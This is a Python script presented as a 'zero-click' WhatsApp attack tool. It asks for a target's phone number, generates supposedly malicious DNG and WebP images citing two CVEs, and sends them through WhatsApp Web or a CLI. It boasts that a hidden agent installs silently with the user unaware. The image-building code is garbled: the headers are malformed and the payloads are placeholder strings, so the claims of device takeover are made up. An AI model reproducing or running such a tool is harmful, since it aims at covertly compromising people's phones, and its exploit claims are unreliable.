#!/usr/bin/env python3
# ============================================
# OBLIVION - WHATSAPP ZERO-CLICK DELIVERY
# Sends malicious image via WhatsApp - NO CABLE NEEDED!
# FOR AUTHORIZED TESTING ONLY
# ============================================

import os
import sys
import json
import time
import base64
import struct
import random
import subprocess
from datetime import datetime
import webbrowser

class WhatsAppZeroClick:
    def __init__(self):
        self.target_phone = ""
        self.exploit_type = ""
        self.payload_file = ""
        
    def generate_malicious_image(self, exploit_type):
        """Generate malicious image that auto-executes on receipt"""
        print(f"\n📸 Generating malicious {exploit_type} image...")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"exploit_{exploit_type}_{timestamp}"
        
        if exploit_type == "DNG":
            # Generate malicious DNG (CVE-2025-21042)
            data = bytearray()
            data.extend(b'DNG\x00')  # DNG magic
            data.extend(b'\x01\x00\x00\x00')  # Version
            
            # Malicious EXIF with payload
            payload = f"OBLIVION_EXPLOIT_{timestamp}"
            exif = f"EXIF:PAYLOAD={payload}".encode()
            data.extend(exif)
            data.extend(b'\x00' * 1024)  # Padding for exploit
            
            filename += ".dng"
            
        elif exploit_type == "WEBP":
            # Generate malicious WebP (CVE-2023-4863)
            data = bytearray()
            data.extend(b'RIFF')
            data.extend(struct.pack('<I', 0xFFFFFFFF))  # Invalid size
            data.extend(b'WEBP')
            data.extend(b'VP8 ')
            data.extend(struct.pack('<I', 0xFFFFFFFF))  # Overflow trigger
            
            payload = f"OBLIVION_EXPLOIT_{timestamp}".encode()
            data.extend(payload)
            data.extend(b'\x00' * 512)
            
            filename += ".webp"
            
        else:
            print(f"❌ Unknown exploit type: {exploit_type}")
            return None
        
        # Save file
        with open(filename, 'wb') as f:
            f.write(data)
        
        full_path = os.path.abspath(filename)
        print(f"✅ Malicious image created: {full_path}")
        return full_path
    
    def send_via_whatsapp(self, file_path):
        """Send file via WhatsApp Web"""
        print(f"\n📤 Sending via WhatsApp...")
        print(f"📁 File: {file_path}")
        
        # Method 1: Open WhatsApp Web with file
        print("\n🔗 Opening WhatsApp Web...")
        print("📤 Drag and drop the file into the chat!")
        print(f"📁 File location: {file_path}")
        print("\n📋 STEPS:")
        print("  1. WhatsApp Web will open in your browser")
        print("  2. Select the target contact/group")
        print("  3. Drag and drop the file into the chat")
        print("  4. Press Send")
        print("  5. The image will auto-process on the phone!")
        
        # Open WhatsApp Web
        webbrowser.open("https://web.whatsapp.com")
        
        return {"status": "ready", "method": "whatsapp_web", "file": file_path}
    
    def send_via_whatsapp_cli(self, file_path, phone_number):
        """Send via WhatsApp CLI (if available)"""
        print(f"\n📤 Sending via WhatsApp CLI to {phone_number}...")
        
        # Try using whatsapp-cli if installed
        try:
            cmd = ["whatsapp-cli", "send", "--number", phone_number, "--file", file_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"✅ Sent via WhatsApp CLI!")
                return {"status": "sent"}
        except:
            pass
        
        print("⚠️ WhatsApp CLI not available - using manual method")
        return self.send_via_whatsapp(file_path)

# ============================================
# MAIN
# ============================================

def main():
    print("=" * 60)
    print("🔥 OBLIVION - WHATSAPP ZERO-CLICK DELIVERY")
    print("=" * 60)
    print()
    
    # Get target phone
    target = input("📱 Enter target phone number (with country code): ")
    if not target:
        print("❌ Phone number required!")
        return
    
    # Select exploit
    print("\n💀 SELECT EXPLOIT:")
    print("  1. DNG Image (CVE-2025-21042) - Samsung devices")
    print("  2. WebP Image (CVE-2023-4863) - All Android")
    print("  3. Both (Maximum chance)")
    
    choice = input("\nSelect option (1-3): ")
    
    exploits = []
    if choice == "1":
        exploits.append("DNG")
    elif choice == "2":
        exploits.append("WEBP")
    elif choice == "3":
        exploits = ["DNG", "WEBP"]
    else:
        print("❌ Invalid choice!")
        return
    
    # Create delivery tool
    tool = WhatsAppZeroClick()
    tool.target_phone = target
    
    print("\n" + "=" * 60)
    print("🎯 TARGET:", target)
    print("💀 EXPLOITS:", ", ".join(exploits))
    print("=" * 60)
    print()
    
    # Generate and send each exploit
    for exploit in exploits:
        file_path = tool.generate_malicious_image(exploit)
        if file_path:
            print(f"\n📤 Sending {exploit} exploit...")
            result = tool.send_via_whatsapp(file_path)
            time.sleep(1)
    
    print("\n" + "=" * 60)
    print("✅ ZERO-CLICK PAYLOADS READY!")
    print("=" * 60)
    print()
    print("📋 WHAT HAPPENS NEXT:")
    print("  1. File is sent via WhatsApp")
    print("  2. Phone auto-processes the image")
    print("  3. Exploit triggers in background")
    print("  4. OBLIVION agent installs silently")
    print("  5. User has NO IDEA!")
    print("  6. Device appears in OBLIVION dashboard!")
    print()
    print("💀 USER AWARENESS: ZERO")
    print("🔐 COMPLETE STEALTH")
    print("📱 NO CABLE NEEDED!")
    print("=" * 60)

if __name__ == "__main__":
    main()